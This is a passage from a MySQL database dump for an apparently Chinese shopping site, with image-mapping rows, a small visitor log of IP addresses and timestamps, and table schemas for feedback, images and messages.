('49E34B1F-55BF-F51C-BFCC-C4AC3E567A79', '72387161-B237-7FC1-3FB3-E78C23533C5C', '9D2E4D3E-C307-D5FC-9D1B-DC13D90C5801.png'),
('4A98EED9-9158-70BA-E306-C8F34363B5B2', '0F0CD553-FCD9-655A-228F-1F57509DD264', 'A67E5DBE-C557-6599-F4F5-C62A0E64924A.png'),
('4B1DAF4E-E804-8D5F-D1E4-71DE07ED958A', 'BEC94BE7-D1A0-D643-6B2D-2FAA1F68B2FD', 'A498C8BD-22B8-E9A1-B055-53A77674DF9E.png'),
('4B87F5AF-938E-5946-3356-3485D9245844', '28FDD4CE-5DC6-FC44-58EE-47ABB5B33BCF', '3846486E-A2A3-DD53-1502-60D712122F39.png'),
('4BBBE5E4-175D-9494-8E08-12210559C8DB', 'B7391928-0D76-8E49-8911-CF772446F9C1', 'CDE7891C-9AA6-54C1-FA8A-09B3EAD2D1A6.png'),
('4D08BCE4-1787-E5FF-EBE2-9B678882ECD5', '241411DE-FEBB-E3B4-4FE8-F73BDE54B32B', '1BFCFED4-8456-65EC-CABF-F531767DA996.png'),
('4DCEB19E-20BA-F268-39BB-CFBB6A993AA9', '8AF4E387-5D09-9D99-DBC7-A22396BE2E51', '12F7EE93-E8C0-7B35-D2DE-C430D598FFA9.png'),
('4EA5B7D2-6440-F687-C75B-F5287F516512', 'B4052C46-F17D-CBD1-4BCF-29DF877B6FA5', '22CF38EA-18FF-9F7C-BEBF-6C94F389062C.png'),
('4F64A798-499B-6773-C168-6645DB308DAD', '77EEE012-05EE-A678-1E84-C30C7FE185AD', '0A739000-82C3-4763-F2A9-D3B102F42E00.png'),
('50AF42C6-862B-8ADC-47B5-25C38DABC8F4', '21B3CE06-EBCB-ECA1-E311-88D1C759C156', 'D439D38F-8A8C-A299-7B1A-4EC47D75E0E9.png'),
('5185B236-004C-71EF-1048-4E18A11A1F00', '511676D4-6E5E-A943-02D2-23838D8A4B2A', 'B9127AAB-6B8D-2FE3-669E-55F296397595.png'),
('51CAE369-55B1-0AB7-BF12-0CB54146CF87', 'B7391928-0D76-8E49-8911-CF772446F9C1', '67BE1325-DC90-74FA-43E3-CB19384D1FCE.png'),
('52753AF0-0AE7-0C03-FD03-72E006A350F0', 'FEF2C2E1-6304-F2CF-C1C7-EA18C9C219EC', 'DD003367-BE0B-5942-6582-7A5E26DE8ADA.png'),
('5353F321-1ED4-DAAC-6D9E-3824CAD0C96D', '38B3FE41-5AB1-F2AF-3446-7E07D8DD8851', '7187256B-2479-F5D7-00EE-A3C35F40C3A0.png'),
('535FEED5-A75C-2AEF-9EC0-4C605D1EAA13', 'AE6D4A9D-7257-836A-2687-8EE3B440594E', 'C5BFEB2A-9646-64F8-28A7-14FA6BD04E4F.png'),
('5399D8BD-BD9A-7E22-F74A-E8598977C8D8', 'DBDD6F97-71D8-FF7D-843F-33A2DA965DE1', '6D63A7A8-B945-CACD-5D78-FA4CE02998F6.png'),
('558B1843-F7AA-A7FC-B7BB-10321225A0A1', 'F72A0711-12B1-2360-6A79-023E0A6FB6BF', '23D2D5D4-E656-41D0-E656-66C29FACFF24.png'),
('5685F676-AC9D-ECAF-FB5D-B93AC309CA33', '38B3FE41-5AB1-F2AF-3446-7E07D8DD8851', '7045C8F7-2A0D-37A9-A618-4E3011B6CBF7.png'),
('57F0F7B0-6C79-B401-B214-82F3E09774B1', '934AE8D8-B061-C383-3FE1-6566C597B7F4', 'F19A377F-166D-FDB7-9216-356E060E7125.png'),
('59FB4B2C-48EA-791F-59F6-4553C369656F', '25AA487A-1A8F-A2A1-E1B5-78EA0EEC85A3', 'BF0520D2-A9C3-8DEE-11F4-04FA8EF6FAD6.png'),
('5A5E2BF3-F7A1-944F-67C2-A0072B795A9F', 'B763DD16-2E58-C493-0434-3952FA160C17', '51FB105B-6092-584F-9FF2-65F5C151A090.png'),
('5F3DDB72-DE2A-6A74-75BF-56C716B7D861', 'FB498C2A-0CB1-403B-A836-D602ABC96AB8', '8823B821-3A03-FB0C-633F-D60EED429CE2.png'),
('62A4C5BE-24DF-FFC8-CFD0-795DD52EF4BC', '0F0CD553-FCD9-655A-228F-1F57509DD264', 'E6759D5B-44C2-5A30-A15B-A7AF57DCC4A9.png'),
('640C1B5B-5692-7FCA-0892-D95FAC4A1498', '629BAE4F-B30D-D852-BFE6-A43A373A2ED8', 'B0BE1894-B02E-C1CB-6E8C-A1EF9836DAA2.png'),
('643F82EF-7F61-3C9B-6C76-62D5255C2557', '1C26D516-A5F1-7C2E-7158-8A658A3F9083', 'B3195156-9300-44C5-56FB-552D8D67FFD7.png'),
('6685CE35-D941-FE7B-E3B9-82064F081032', '28FDD4CE-5DC6-FC44-58EE-47ABB5B33BCF', '109F016B-58BD-7648-0449-5061D3662A8B.png'),
('67281DD3-34A5-9FA1-1E74-E7FB6F0D5CE2', '6FFC6691-7F05-8AB8-B1E1-5C839BB4F446', '33C5B3E9-5A00-6B10-3CDF-B5DAE2F38165.png'),
('673D94FA-01E2-6F9F-D35F-9F87C3CA22F7', '1C26D516-A5F1-7C2E-7158-8A658A3F9083', '6350699E-CD5B-DC0A-198C-78320274A619.png'),
('68682B3E-4C3A-2653-9172-AAADA17E6E43', '629BAE4F-B30D-D852-BFE6-A43A373A2ED8', '2015B558-5D42-A24F-ADD8-A218F198AADA.png'),
('6969DD59-9755-D39E-E3C7-BC29CC3FAF58', '1581855B-4F44-E6F1-8E95-59AD9A5A0C5D', 'BC274C9E-9C6E-7DB5-FA4A-2144C9BE00A7.png'),
('6A0BCF51-27AF-CF97-EF14-2C3C2D0FF4FC', 'B763DD16-2E58-C493-0434-3952FA160C17', '9796E404-5FCA-D869-3886-FEB1491B55B8.png'),
('6CDB09E3-6B1A-D0FF-C0A9-AFF9069CAA9E', 'D5CD3549-48F1-F39A-F547-EF40372ECC5D', 'E2D358F8-FA78-D90A-0C16-75B63185C9FD.png'),
('6D516C12-5107-7895-7028-C9EEF0C8F9FF', '92BAFEFD-CCE6-03EF-60A8-DF9954DDDCA9', 'ECC6053E-3DAA-7304-73C8-0362A0D10384.png'),
('6EE2613D-FC89-AE02-82A7-7D650D0698EB', 'B4052C46-F17D-CBD1-4BCF-29DF877B6FA5', 'D46A95BE-F796-F431-F482-6734C01B4E71.png'),
('71C7A57B-9009-C51E-05E6-F04994140EE3', '72599D9A-E2FE-0D2C-B74A-DBDE17AA0E2E', '5500728D-D2E8-8AD6-2BAA-D1CDDD814E3C.png'),
('732BE371-9B32-4E16-6DC7-FB01B28A04CA', '511676D4-6E5E-A943-02D2-23838D8A4B2A', '23067377-7E94-10E7-5C34-21645A37329D.png'),
('73BACA15-167F-C310-7BBE-63F0E1D6E824', 'AE6D4A9D-7257-836A-2687-8EE3B440594E', '70232E37-76E7-E8C4-B951-5EF7679CC00D.png'),
('7867AD6A-E236-F756-33CD-51C7874B5CD4', 'B5037D54-D3D0-F1EE-5939-523BCBF8F2C6', 'ADB51A5B-975A-5C4B-20C9-2ED42A64D0A1.png'),
('7941B3EB-B8EC-4D31-DFE9-144C3398DD46', '2D089988-6636-BF15-676F-15A6AED0433F', '927D140D-EB1F-D98E-CE5C-9DD929FED54E.png'),
('7AB05D8B-E47E-11B3-5D04-65A1F207FC7A', 'EE5D2613-2760-F18C-A447-B8E744FF509D', '8297B86A-D2A5-D1DB-24C9-4D4CB92D3A07.png'),
('7B5A092C-F92E-3032-40DB-80299977754D', '37B10231-4225-C269-DB28-F1C40A6CA448', 'B1146293-F799-9106-575F-C4B6C0B1AF73.png'),
('7CF79B74-B70C-B0EB-2B98-A2ED8A983D11', 'FF815C07-E3C4-C632-F29C-42FE92C32AF9', 'FBD41B53-220E-6EDF-57C7-F40EF67E6B4F.png'),
('7CF8EDFF-4402-08BB-5CA4-44827EF6F0D8', 'D678064A-D80E-EFA2-4A01-873583FF3E9B', 'F919C117-D5E4-A59D-5FB9-4C8A9A0A8D82.png'),
('7DB13D3C-18C4-3B1E-6464-7901E11398A9', '25AA487A-1A8F-A2A1-E1B5-78EA0EEC85A3', 'A7C465B2-E5B6-FDFE-0C69-A57BE07D7071.png'),
('7E3D9882-49AD-4431-203D-8C89ED003B90', '77EEE012-05EE-A678-1E84-C30C7FE185AD', 'AA3F4F65-F961-19CC-C784-974D1F8F2687.png'),
('7F0B232F-47C3-BBFE-4C23-4C593526313D', '47D002AB-DFA4-11CF-52FB-398122144EF1', '9A6A827D-6D87-3588-44F3-AA5E0D5A2FF5.png'),
('8424C292-BD6F-2491-F6CD-CFCDAB9EA8B5', 'FB498C2A-0CB1-403B-A836-D602ABC96AB8', 'D378C0BD-532B-A999-D988-01384C0A5708.png'),
('869CD882-5FB6-3F00-0A4E-2C4EB51924D1', '934AE8D8-B061-C383-3FE1-6566C597B7F4', 'A17ACA04-F280-E772-D52B-F55D49DD0CCD.png'),
('86E7BA6E-4A64-B962-D39B-62AA28347098', 'D708E35B-239A-0E3B-3988-B7EA5C3A3066', '28B656EC-ABAF-B5B4-6F1B-C2BE11321F1D.png'),
('880F85DB-B6B0-A734-3A9F-03187B58E89F', 'B7391928-0D76-8E49-8911-CF772446F9C1', '9FCC8B87-4E94-615D-C720-1C627E2844A1.png'),
('889D9024-5415-536A-BB48-6D25702DFD68', '629BAE4F-B30D-D852-BFE6-A43A373A2ED8', 'BE1C8D5F-1DA4-8ABC-5C84-E4BEACE81C00.png'),
('8A3D0EDC-7D65-DF90-F537-4AD703682925', '3BAADFC7-A792-40D4-6BF3-978F5F868196', '5DA0B41C-2658-690F-9001-0F5FFEA74985.png'),
('8B2D0B3B-CF2D-CE59-3C7E-6E30FA611B2F', '61F54F17-89B5-A2B6-2A20-353A55A4F6D5', 'CF2E498E-A081-8448-6F8A-858A6AA52FC5.png'),
('8F6AFFF0-9D13-1825-2507-AEE89EDBFE2D', '63D87121-EC06-A576-DE0F-386A49F4243B', '909FC01D-4F04-9469-FCA6-D569BB8BF4DE.png'),
('8FFE6AE0-B9AB-A8CE-47CB-5D54AB240FAD', '72599D9A-E2FE-0D2C-B74A-DBDE17AA0E2E', 'D0F95870-2579-75A2-26FB-173395EEB45E.png'),
('91CBA1F6-21A4-DE27-A244-42E3A9840DA7', 'EE5D2613-2760-F18C-A447-B8E744FF509D', '0B6435C4-6E03-D2B0-60B6-2E0D2153A68F.png'),
('93D33405-3A24-1BEE-EA45-661D472AB43A', '89C19CC9-AADE-EF8F-3D2A-FD244AC2C51D', '97D1C0FD-1A68-3204-FC3B-CF0D9405ADF1.png'),
('94C8CF9E-04B8-0B0F-8A55-D6D63CE7A452', '179149C6-2255-FAA2-F9F8-CA6608080FAA', 'D9D86B77-4CE4-7DA0-759C-2489FF3B3964.png'),
('95D96BDE-4630-2324-7363-3B70D0C9FCFA', '76B76EF4-179E-352C-2A1B-1A7020C43172', 'F79E922A-0AC1-BAFC-D5C2-E56FFC5743FA.png'),
('96861A8D-03FE-C1BF-DF1E-F4EDBBB29038', 'B1096A78-4A70-39E0-EBE4-3523CE963812', 'D597D93C-98A6-CAA4-199F-15D3ACB1DD0C.png'),
('971B6393-73AE-099A-1747-04CC49973F76', 'D678064A-D80E-EFA2-4A01-873583FF3E9B', '38E82FCC-FB99-559C-3398-F89FABFFF18B.png'),
('983C4329-2A64-7CE5-960C-BD79F9482F88', '433DA60D-5065-1301-48B8-76D1BB06CDF0', '503DA1B8-80F7-F31D-4DD7-A1CFFB9F8C83.png'),
('9CD73629-7F0D-C139-15A0-30F8BF9C2733', 'D2BCDC64-0970-3775-3193-6D870A490A84', '703BFFC9-E206-E21A-772A-F8E9A869A952.png'),
('9CE91289-6BC7-B64E-9B34-AE9ECFC6D47C', 'B5037D54-D3D0-F1EE-5939-523BCBF8F2C6', '8D02BA0F-B785-F10B-79DA-3EC279E32D8A.png'),
('9D02D13E-A08D-B554-F789-742E5F03980A', 'C3E30939-86EB-730F-900E-17B582155781', '123F7DC5-5222-AF32-C0A8-648F51DF0324.png'),
('9DE11212-A2DA-5DE8-1F9E-A05283AD771B', '629BAE4F-B30D-D852-BFE6-A43A373A2ED8', 'E8BC7D81-7CBB-DE52-DE35-3DB9727BD1C7.png'),
('9DFBE04C-CA62-7FD7-580D-CB875B00014D', 'D708E35B-239A-0E3B-3988-B7EA5C3A3066', '8197BF6B-16CE-A046-33A9-3D731E2E3D11.png'),
('9ECA2961-DC76-0605-52AB-6F4094EA951F', '179149C6-2255-FAA2-F9F8-CA6608080FAA', 'D07AC7DA-6F17-9EC6-EA9C-7DDE1A466D43.png'),
('A0C78B47-0606-A78D-FAB7-9D0E27CCB771', '179149C6-2255-FAA2-F9F8-CA6608080FAA', '3EC38AD2-1CC7-0373-78A4-032EEA15B676.png'),
('A0D58D68-BDDB-F909-CBB6-494C75BB1206', 'D2BCDC64-0970-3775-3193-6D870A490A84', '6CB82C67-F8A9-BFE2-8F59-21524B90D7A4.png'),
('A206D89D-4B0E-DE89-3540-47EF6F3EDB4C', '28FDD4CE-5DC6-FC44-58EE-47ABB5B33BCF', '7C095CDE-A08F-17E4-B073-75725BCC04DA.png'),
('A258E03C-C85F-A856-DF40-6842D6CCF63C', '96A28FC7-E21C-2185-D3BC-4DD5FE91ADB7', 'FAF79646-6C06-14DD-58C2-493F260D9448.png'),
('A26631F6-BF74-6120-AE4B-B48B14259F75', '54BD8F84-B0F0-2F73-E5AE-DFB102E48C79', '4808DC55-A492-AF18-9067-A9FF85B7DF5B.png'),
('A26C6F8F-62BD-7011-4728-1A8C06C0B59B', 'F7BC08D4-A15A-0784-3456-04EE6D29C689', '2A3D0094-9CDB-F12F-7789-5FA986097EF5.png'),
('A4A73C7A-46AD-F92B-DC43-F6279FB5306E', '1C26D516-A5F1-7C2E-7158-8A658A3F9083', 'C48809C5-1916-F829-8490-3A99D06CC7C8.png'),
('A4D4DF89-67B7-D5D5-5717-A8FC929E191C', '77EEE012-05EE-A678-1E84-C30C7FE185AD', '0CD71CE2-455C-8A3F-F3ED-18351A1EBA1D.png'),
('A6163558-46AE-63A3-1C47-6A28ACB119F5', 'B5037D54-D3D0-F1EE-5939-523BCBF8F2C6', '428B2F0E-08DB-BC4F-9FAF-5A46B6A9BAC1.png'),
('A78D62A0-E0D0-970C-703E-B96CF7701470', '934AE8D8-B061-C383-3FE1-6566C597B7F4', '580D5E61-87CF-50C7-3F53-5F4A1D886580.png'),
('AB688D8F-D99C-41FA-E672-1D3CEBC9C2BC', 'D708E35B-239A-0E3B-3988-B7EA5C3A3066', '9AD3F274-6DD5-EF22-88E9-FAE738C2F085.png'),
('AD7C7006-DDAD-5BC4-6979-BE52BCB347E4', '753C793E-1F5D-1DC7-4103-A23D23E016C2', '998CC4B9-2DBA-631E-8604-20B1FF70EE38.png'),
('ADD99A97-DA0B-0623-0AC4-82D1E537B1FD', '6FFC6691-7F05-8AB8-B1E1-5C839BB4F446', '59395775-928E-A845-172F-1284CFCE87E2.png'),
('ADE35F01-19B3-597A-2B24-A33CF4B157DA', '96A28FC7-E21C-2185-D3BC-4DD5FE91ADB7', 'C6D7C71D-7826-A291-6321-B440785E72D0.png'),
('B0B7D637-E98A-5F02-27F2-BB169330D1DC', '72599D9A-E2FE-0D2C-B74A-DBDE17AA0E2E', '1B35A50B-7845-92A9-0E06-EFBB32F01631.png'),
('B24B6CA7-B4B4-A6AE-170F-1F31568EE89B', '433DA60D-5065-1301-48B8-76D1BB06CDF0', '6AB942BE-5142-231F-6923-6624B7317021.png'),
('B2D87EB9-9A0D-A577-77AF-24138822CAD7', '21B3CE06-EBCB-ECA1-E311-88D1C759C156', '0F916C0D-AE01-944F-6AE1-F0931811FC38.png'),
('B40B3100-E0B7-498D-8F39-3B19F9BB325F', 'B7391928-0D76-8E49-8911-CF772446F9C1', 'D57F1CAC-A569-558D-B9C4-0365447AA8E0.png'),
('B4166F4B-E34C-A579-45EB-25BE37104937', '433DA60D-5065-1301-48B8-76D1BB06CDF0', 'BA5A4691-D21F-9516-EE0F-736228662D95.png'),
('B4339413-D5A6-E1DB-5931-CCD56B703891', '2D089988-6636-BF15-676F-15A6AED0433F', '014ABA05-3A66-B41B-CDBE-14FFFD7DC4E2.png'),
('B53D8581-817D-B622-F3C3-DE249C6AEB34', '241411DE-FEBB-E3B4-4FE8-F73BDE54B32B', '4D0C74AC-FBA4-4229-0820-36C4EE9E11E1.png'),
('B8B0CDEC-2F40-DD0D-E3F8-C752D05F99E0', '1581855B-4F44-E6F1-8E95-59AD9A5A0C5D', '080CA9D6-CD5A-9D18-471C-167F94F71703.png'),
('B95A87C1-B206-37E3-D3F2-34C96BBF9E15', '8AF4E387-5D09-9D99-DBC7-A22396BE2E51', '7E4D4608-548D-10D5-0B41-7ACA38617E6A.png'),
('B9FF52B8-95F2-18E8-55A5-994465A1CDA6', '96A28FC7-E21C-2185-D3BC-4DD5FE91ADB7', 'B8227999-745C-4AB6-C95D-C57E1924AED8.png'),
('BA6A2FF8-B830-E558-3420-AF95D7F58707', '22B10E64-2792-9976-E179-2481FBD15CB5', '92C835A4-5DA5-0E43-8386-5C32378CC77C.png'),
('BAFCF423-02AE-098E-2BBA-CEC87D969A66', '21B3CE06-EBCB-ECA1-E311-88D1C759C156', '87EA97DE-47A3-C080-165B-7E8BDCD578C1.png'),
('BAFDF589-1479-7D92-0D21-3D9FA7CA388F', '6D025479-654E-5D3F-2B6D-ECF783A2D918', 'B59440A9-3A93-B9E8-EBBA-53425F78A136.png'),
('BEFF68EF-B07E-B032-36FB-850F0FFBC50E', '1C26D516-A5F1-7C2E-7158-8A658A3F9083', 'E56FA03A-738D-500E-F9C4-C84636B61F6F.png'),
('BFF7FD66-077A-46E7-FADA-2925CA3B1AA0', '89C19CC9-AADE-EF8F-3D2A-FD244AC2C51D', '92357BBF-C8CB-45D9-DB8D-67F1C84EDE0C.png'),
('C0B7D3CA-73BC-2ABD-0CE4-E61A4E829B23', '37B10231-4225-C269-DB28-F1C40A6CA448', '1942A9BD-1C3B-3951-4019-C949EA86E993.png'),
('C1F833F9-ADE2-988A-995E-4C9B1B89F2C4', '63D87121-EC06-A576-DE0F-386A49F4243B', '0DF22A69-E617-08E9-7541-A2D143A7F4F5.png'),
('C2A118C9-1095-2765-EFD0-376C66BC6B09', 'FEF2C2E1-6304-F2CF-C1C7-EA18C9C219EC', '4CA86FB7-9258-BC3A-C0C4-1F21005B59E9.png'),
('C8A8BAE2-418D-8F27-37D7-2969A761F2DC', 'F396C933-04BC-E46D-012F-AE67F7DD37EE', '7875BFCD-4332-B52D-797B-3F00FE252FF1.png'),
('C8F57565-F79D-0598-B4BA-4FA271A41E36', 'B5037D54-D3D0-F1EE-5939-523BCBF8F2C6', 'ED9D8930-505A-B2A3-48E6-5C16212B5E1C.png'),
('CB0253E0-FEE9-8D20-9471-BC9F05B55615', '61F54F17-89B5-A2B6-2A20-353A55A4F6D5', 'C42846B3-6FFB-8819-1D80-3F798D0F5979.png'),
('CB420F6D-2768-F2BB-EE1B-31CCF0ABA4F5', '1C26D516-A5F1-7C2E-7158-8A658A3F9083', '32156F6D-2601-5460-EE18-6499A4A08901.png'),
('CBC674B6-52FD-25E6-70A8-31D359D2808B', 'B1096A78-4A70-39E0-EBE4-3523CE963812', '3A5AE4BF-34DD-B5AA-3025-368FFA500D79.png'),
('CCACBE2E-C88F-0283-8F1B-537D65E854D5', 'B33E6242-90AA-0E1A-17AE-3B2F7C20FBC1', 'F4BBC2CB-F41D-264B-6865-987381696B76.png'),
('CFB162FF-99DA-BB66-1C3C-55C91BDF2ABD', 'DBDD6F97-71D8-FF7D-843F-33A2DA965DE1', 'FDAA5580-6CAF-83C2-48EF-6BBB0BA1F307.png'),
('D007DA3A-5ABB-D49C-9EAF-8AA591735A4F', 'F7B2B9AF-0CE7-BCFA-194D-842C08DEA654', '658CA3F7-2F95-C52C-3465-1B70EF681B29.png'),
('D038D912-5AF2-F399-28AF-85F96E4D7FE5', '76B76EF4-179E-352C-2A1B-1A7020C43172', '57F7369B-D887-6B31-846B-AE1D1323D916.png'),
('D0799476-AA5F-24DC-4271-B3CD5FA807E7', '72387161-B237-7FC1-3FB3-E78C23533C5C', 'ADE170F9-0E29-D207-4AC9-FCD0F3EA02F7.png'),
('D1FA4618-99AA-4EFD-CFDC-DE8A91266EC4', '241411DE-FEBB-E3B4-4FE8-F73BDE54B32B', 'B2E59875-9654-B43B-938C-DB104C750334.png'),
('D232C6E4-4AF5-B05E-7137-19786A81A99B', '3BAADFC7-A792-40D4-6BF3-978F5F868196', 'BB170120-3EE8-A9F3-FEBC-6352BB97D1EE.png'),
('D70A6647-B13B-520F-8CF0-3E89C2DADC6A', 'F7B2B9AF-0CE7-BCFA-194D-842C08DEA654', '1CE754AB-E7A0-5DE6-0959-91EC7A74735E.png'),
('D8A3CE6F-794A-FF93-E091-AD8C1DBE4AAC', '629BAE4F-B30D-D852-BFE6-A43A373A2ED8', '62ADF60A-590F-1D1E-B75B-05979257AF90.png'),
('D931EF54-20DE-6691-882A-B5E1A3E61E8A', '8AF4E387-5D09-9D99-DBC7-A22396BE2E51', 'FA44EE2C-1C1A-4065-30E7-E35A807C73D1.png'),
('D9F1B3E1-3679-6621-771A-37C4CA1CE331', '00D84306-7B0D-F027-28E4-09D70124D2CB', 'CFEDF8F6-749A-5565-F853-DA50C5878664.png'),
('DB94095A-BF92-2CF1-350C-19640A7F3976', '5CA23A19-E354-364B-17A8-0E98A7DB53D0', 'C0FA8E11-C7E4-9AE6-E7C3-1620ED17F46C.png'),
('DD028C8A-2BF8-DA14-509B-EE9FDE124E73', '54BD8F84-B0F0-2F73-E5AE-DFB102E48C79', '85C8372E-99DF-9C0D-6F2F-099C2548DF60.png'),
('DF70CE22-CB98-85AA-1C3A-B7C234B432AF', '6D025479-654E-5D3F-2B6D-ECF783A2D918', '5E975A04-3F5F-6DE9-83DF-7D4764C2103C.png'),
('E12DFC1F-969F-2CED-0422-B75C8250B099', 'B4052C46-F17D-CBD1-4BCF-29DF877B6FA5', 'C5AF23EC-756A-DB9E-99A5-8DA2B7D31EE5.png'),
('E45E5E01-40D7-4896-BD53-5EB15A2FDF97', '61F54F17-89B5-A2B6-2A20-353A55A4F6D5', 'B370C11B-25F3-A9CF-E4A7-697971DB8FDD.png'),
('E6456732-6563-0B1A-E5E2-B52D4C6686B2', 'F51D327E-3EFE-0E64-BA0A-E122DB83F189', 'D89107BB-03E6-3353-B29F-CA5FFE5051E8.png'),
('E7927A03-898A-81E8-92A9-1DAF7696EE82', 'B33E6242-90AA-0E1A-17AE-3B2F7C20FBC1', 'C6A718A3-4005-B19D-3C1A-DCCDB794D9DD.png'),
('E89B23AF-F90E-E165-6ECF-D0E63771A7C6', 'EE5D2613-2760-F18C-A447-B8E744FF509D', '1D6ECD1F-2D1B-4A9C-26BE-C5ACE83CE49E.png'),
('E8DD390B-8A00-2484-572A-EFB32A807320', '72387161-B237-7FC1-3FB3-E78C23533C5C', '9CFD2B3D-187C-6DCA-D98C-6DFA1ECDFF05.png'),
('E9036D18-7C64-231D-EB98-010E4559BF8F', 'D5CD3549-48F1-F39A-F547-EF40372ECC5D', 'C58CCEFD-34D8-E784-25C9-40685F4DD880.png'),
('EA9C9F7D-83C9-6327-35D3-08713DBE2D92', 'E1A02C6D-C1C6-A748-983D-A236648BDCD4', 'B521368A-73CA-C9E1-A427-F8CBC92E73A0.png'),
('EB0675F0-EC22-6EA9-69C5-C62CD6F33E89', 'F7BC08D4-A15A-0784-3456-04EE6D29C689', 'AD9B3BD0-DC94-7FAB-7805-157E0E0F53D6.png'),
('EB55A182-6913-7F08-E7F4-41821E4F453F', '25AA487A-1A8F-A2A1-E1B5-78EA0EEC85A3', 'E841DE8F-35A5-7FC3-795B-4EB50BDACB7B.png'),
('EBAF7894-9898-3857-7ADC-ED5B87DCF8E3', 'F7BC08D4-A15A-0784-3456-04EE6D29C689', 'BB9230A3-BD03-7C21-F4AB-C4F364BD81AB.png'),
('ED0BCE47-3943-26D8-B892-761CEF699711', 'DBDD6F97-71D8-FF7D-843F-33A2DA965DE1', 'D2D4BD58-4F9C-6F71-3E80-6C61B01C5DD7.png'),
('ED2B445C-4844-0E94-C2C5-990971DC81E4', '6275F89C-A2A1-8B7B-A259-94926A84C442', 'CF2FFDF4-2229-9D44-523E-10DDA3138F86.png'),
('ED60B1A2-A44A-F830-BF16-6300ED800322', 'D678064A-D80E-EFA2-4A01-873583FF3E9B', 'DDDC1140-0CE9-3A1C-CA05-DA867E9A6750.png'),
('EDD1DE37-1BBB-E76B-40C7-59A2D7753B54', 'F51D327E-3EFE-0E64-BA0A-E122DB83F189', '8E362734-3D60-5F96-211C-2001A835B13E.png'),
('EE4AD4EF-2C0A-3334-6A55-0707F48E9FB9', '28FDD4CE-5DC6-FC44-58EE-47ABB5B33BCF', 'EB9C3F18-0424-8630-923C-3FE05FB7B439.png'),
('F19BDE97-30CC-F83B-14A9-EEDB10BD3753', '5CA23A19-E354-364B-17A8-0E98A7DB53D0', '9C9657BF-ABFF-5A29-26B5-7C6BA4F10CA0.png'),
('F1E81D5D-8330-5595-EED8-19F1805C1FBE', 'E1A02C6D-C1C6-A748-983D-A236648BDCD4', '89F7EE4C-1CA5-9245-D06E-EA9439918A75.png'),
('F2560095-2487-8A82-7317-A2B4A69DAB4B', 'AE6D4A9D-7257-836A-2687-8EE3B440594E', '8C293BCC-337D-EB61-3960-2F4064D9109D.png'),
('F25E0629-8307-4807-5AD8-A664EC90AD00', 'B763DD16-2E58-C493-0434-3952FA160C17', '68068479-31AB-11C9-6827-04F61B03BF3F.png'),
('F56969D2-3DC7-20CD-6159-CEF4DC50B32A', 'B763DD16-2E58-C493-0434-3952FA160C17', 'F5688214-D4BD-08CF-F4BF-4A50A48B6311.png'),
('F743338B-955E-774D-E315-A6B8C4D4E1BE', '3BAADFC7-A792-40D4-6BF3-978F5F868196', '33827510-0497-A5FC-AEDE-13C1F7D4E659.png'),
('F9F60FD9-3B1C-1504-D0F9-6065B14B10F2', '72387161-B237-7FC1-3FB3-E78C23533C5C', '94E94A81-ADE7-DF43-354D-8C4CEA132FAC.png'),
('FA4C41FE-77AE-F08C-BC58-248AC8C7954E', '63D87121-EC06-A576-DE0F-386A49F4243B', '75ED7BE7-056F-1329-896A-3BA62682DD58.png'),
('FC5CA25C-C2D8-6826-6548-E94562843927', 'B33E6242-90AA-0E1A-17AE-3B2F7C20FBC1', '5205796A-3BCE-0D01-2D39-1D6B66B84053.png'),
('FC7C5A24-E620-FD6E-FAFE-99DBC8672C75', '6D025479-654E-5D3F-2B6D-ECF783A2D918', 'B5E3030F-C5B2-4BF8-8F7E-E4199175D58F.png'),
('FDD891B5-59FB-8E89-31C9-B0F1F9F098E8', 'F51D327E-3EFE-0E64-BA0A-E122DB83F189', 'EA4D61E2-2E6B-B9D2-1549-6CF433674687.png');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_count`
--

CREATE TABLE `shopp_count` (
  `id` int(11) NOT NULL,
  `ipcontent` varchar(255) NOT NULL,
  `time` varchar(255) NOT NULL,
  `user` varchar(100) DEFAULT NULL,
  `modle` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_count`
--

INSERT INTO `shopp_count` (`id`, `ipcontent`, `time`, `user`, `modle`) VALUES
(1, '113.109.115.58', '1526018456', '手机端', 'phone'),
(2, '113.109.115.58', '2018-05-11 02:03:08', '手机端', 'phone'),
(3, '171.111.62.209', '2018-05-11 02:03:25', '手机端', 'phone'),
(4, '113.12.143.5', '2018-05-11 02:03:37', '手机端', 'phone'),
(5, '61.151.226.53', '2018-05-11 02:04:25', '手机端', 'phone'),
(6, '117.181.41.14', '2018-05-11 02:05:59', '手机端', 'phone'),
(7, '119.129.101.128', '2018-05-11 02:07:45', '手机端', 'phone'),
(8, '183.48.30.71', '2018-05-11 02:09:58', '手机端', 'phone'),
(9, '117.136.31.225', '2018-05-11 02:10:37', '手机端', 'phone'),
(10, '117.181.41.14', '2018-05-11 02:10:58', '手机端', 'phone'),
(11, '101.226.86.152', '2018-05-11 02:11:37', '手机端', 'phone'),
(12, '117.136.31.225', '2018-05-11 02:12:13', '手机端', 'phone'),
(13, '218.20.4.103', '2018-05-11 02:16:17', '手机端', 'phone'),
(14, '113.111.202.112', '2018-05-11 02:16:41', '手机端', 'phone'),
(15, '113.109.115.58', '2018-05-11 02:17:41', '手机端', 'phone'),
(16, '106.127.3.104', '2018-05-11 02:17:52', '手机端', 'phone'),
(17, '113.109.115.58', '1526019529', 'admin', 'admin/Index/index'),
(18, '106.127.3.104', '2018-05-11 02:19:11', '手机端', 'phone'),
(19, '117.136.31.136', '2018-05-11 02:19:22', '手机端', 'phone'),
(20, '106.127.3.104', '2018-05-11 02:20:14', '手机端', 'phone');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_feedback`
--

CREATE TABLE `shopp_feedback` (
  `id` varchar(36) NOT NULL COMMENT '反馈表',
  `title` varchar(250) NOT NULL,
  `content` text NOT NULL,
  `creation_time` varchar(40) NOT NULL,
  `user_id` varchar(36) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `shopp_images`
--

CREATE TABLE `shopp_images` (
  `id` varchar(36) NOT NULL,
  `path` int(11) NOT NULL,
  `image_type_id` varchar(36) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- 表的结构 `shopp_image_type`
--

CREATE TABLE `shopp_image_type` (
  `id` varchar(36) NOT NULL,
  `title` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- 表的结构 `shopp_message`
--

CREATE TABLE `shopp_message` (
  `id` char(36) NOT NULL,
